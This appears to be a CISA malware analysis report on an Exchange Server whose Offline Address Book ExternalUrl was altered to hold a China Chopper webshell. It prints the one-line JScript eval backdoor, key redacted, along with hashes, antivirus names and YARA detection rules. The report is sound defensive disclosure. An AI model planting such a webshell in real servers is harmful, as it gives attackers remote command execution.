Summary      Description     CISA received two files for analysis. These files appear to contain configuration data for two different Microsoft Exchange Offline Address Book (OAB) Virtual Directories (VD) extracted from a single Microsoft Exchange Server. Both output files show malicious modifications for the ExternalUrl parameters for these two OAB VDs on the targeted Exchange Servers. In one of the OAB VDs, the ExternalUrl parameter contains a \"China Chopper\" webshell which may permit a remote operator to dynamically execute JavaScript code on the compromised Microsoft Exchange Server.

Description     This file is an OAB configuration file from a legitimate Set\\-OABVirtualDirectory cmdlet. This file is typically used to edit an OAB VD in Internet Information Services (IIS) on Microsoft Exchange servers. Analysis indicates this file contains log data collected from an OAB configured on a compromised Microsoft Exchange Server. The Exchange OAB VD is utilized to access Microsoft Exchange address lists. For this file, the OAB ExternalUrl parameter has been modified by a remote operator to include a \"China Chopper\" webshell which is likely an attempt to gain unauthorized access for dynamic remote code execution against a targeted Microsoft Exchange Server. In this file, the OAB ExternalUrl parameter was configured to accept JavaScript code which will directly be executed on the target system. The modification of the ExternalUrl parameter suggests the operator can dynamically submit queries to this Exchange OAB VD containing JavaScript code that will be executed on the target system.       In this file, the ExternalUrl designation that normally specifies the Uniform Resource Locator (URL) used to connect to the VD from outside the firewall has been replaced with the following code:       \\-\\-Begin Code\\-\\-     hxxp\\[:]//f/\\<script language\\=\"JScript\" runat\\=\"server\"\\>function Page\\_Load(){eval(Request\\[\"\\[REDACTED]\"],\"unsafe\");}\\</script\\>     \\-\\-End Code\\-\\-       Note: The hard\\-coded key used for authentication was redacted from the code above.       This code allows an attacker to access the shell using a password. Once accessed, the attacker is able to execute commands on the page with server (system) level privileges.       1e0803ffc283dd04279bf3351b92614325e643564ed5b4004985eb0486bf44ee     Tags     backdoortrojanwebshell     Details     | Name | discover.aspx | | --- | --- | | Size | 2230 bytes | | Type | HTML document, ASCII text, with CRLF line terminators | | MD5 | ca7df873422d59c358397d3cb44ae6aa | | SHA1 | f95be23d52cbaa24bde99cf33a9be55bca688972 | | SHA256 | 1e0803ffc283dd04279bf3351b92614325e643564ed5b4004985eb0486bf44ee | | SHA512 | 9e696ad26291e391cb29aff1845f78f0024f4808b10aa17cf7192f6f144378ea43b5533e3e0669cc19b07d88e00f4be39a95fa5500559573177b59585b7dad30 | | ssdeep | 48:kNrdelW1BDc0oM5QZLhPYFzQ14ONF0q6q:ktdelWfXWYF0PNCq6q | | Entropy | 4\\.657248 |     Antivirus     | Ahnlab | Exploit/ASP.Cve\\-2021\\-27065\\.S1406 | | --- | --- | | BitDefender | Generic.ASP.WebShell.H.29944B27 | | ClamAV | Asp.Trojan.Webshell0321\\-9840176\\-0 | | Emsisoft | Generic.ASP.WebShell.H.29944B27 (B) | | Ikarus | Exploit.ASP.CVE\\-2021\\-27065 | | Lavasoft | Generic.ASP.WebShell.H.29944B27 | | McAfee | Exploit\\-CVE2021\\-27065\\.a | | Microsoft Security Essentials | Exploit:ASP/CVE\\-2021\\-27065 | | Quick Heal | CVE\\-2021\\-26855\\.Webshll.41350 | | Sophos | Troj/WebShel\\-L | | Symantec | Trojan.Chinchop |     YARA Rules   * rule CISA\\_10328929\\_01 : trojan webshell exploit CVE\\_2021\\_27065     {     meta:     Author \\= \"CISA Code \\& Media Analysis\"     Incident \\= \"10328929\"     Date \\= \"2021\\-03\\-17\"     Last\\_Modified \\= \"20210317\\_2200\"     Actor \\= \"n/a\"     Category \\= \"Trojan WebShell Exploit CVE\\-2021\\-27065\"     Family \\= \"HAFNIUM\"     Description \\= \"Detects CVE\\-2021\\-27065 Webshellz\"     MD5\\_1 \\= \"ab3963337cf24dc2ade6406f11901e1f\"     SHA256\\_1 \\= \"c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5\"     strings:     $s0 \\= { 65 76 61 6C 28 52 65 71 75 65 73 74 5B 22 \\[1\\-32] 5D 2C 22 75 6E 73 61 66 65 22 29 }     $s1 \\= { 65 76 61 6C 28 }     $s2 \\= { 28 52 65 71 75 65 73 74 2E 49 74 65 6D 5B \\[1\\-36] 5D 29 29 2C 22 75 6E 73 61 66 65 22 29 }     $s3 \\= { 49 4F 2E 53 74 72 65 61 6D 57 72 69 74 65 72 28 52 65 71 75 65 73 74 2E 46 6F 72 6D 5B \\[1\\-24] 5D }     $s4 \\= { 57 72 69 74 65 28 52 65 71 75 65 73 74 2E 46 6F 72 6D 5B \\[1\\-24] 5D }     condition:     $s0 or ($s1 and $s2\\) or ($s3 and $s4\\)     } * rule CISA\\_10328929\\_02 : trojan webshell exploit CVE\\_2021\\_27065     {     meta:     Author \\= \"CISA Code \\& Media Analysis\"     Incident \\= \"10328929\"     Date \\= \"2021\\-03\\-17\"     Last\\_Modified \\= \"20210317\\_2200\"     Actor \\= \"n/a\"     Category \\= \"Trojan WebShell Exploit CVE\\-2021\\-27065\"     Family \\= \"HAFNIUM\"     Description \\= \"Detects CVE\\-2021\\-27065 Exchange OAB VD MOD\"     MD5\\_1 \\= \"ab3963337cf24dc2ade6406f11901e1f\"     SHA256\\_1 \\= \"c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5\"     strings:     $s0 \\= { 4F 66 66 6C 69 6E 65 41 64 64 72 65 73 73 42 6F 6F 6B 73 }     $s1 \\= { 3A 20 68 74 74 70 3A 2F 2F \\[1] 2F }     $s2 \\= { 45 78 74 65 72 6E 61 6C 55 72 6C 20 20 20 20 }     condition:     $s0 and $s1 and $s2     }     ssdeep Matches     No matches found.

Mitigation      If you find these webshells as you are examining your system for Microsoft Exchange Vulnerabilities, please visit the https://us\\-cert.cisa.gov/remediating\\-microsoft\\-exchange\\-vulnerabilities website for further information on remediation.      Recommendations      CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.   * Maintain up\\-to\\-date antivirus signatures and engines. * Keep operating system patches up\\-to\\-date. * Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication. * Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required. * Enforce a strong password policy and implement regular password changes. * Exercise caution when opening e\\-mail attachments even if the attachment is expected and the sender appears to be known. * Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests. * Disable unnecessary services on agency workstations and servers. * Scan for and remove suspicious e\\-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header). * Monitor users' web browsing habits; restrict access to sites with unfavorable content. * Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.). * Scan all software downloaded from the Internet prior to executing. * Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).
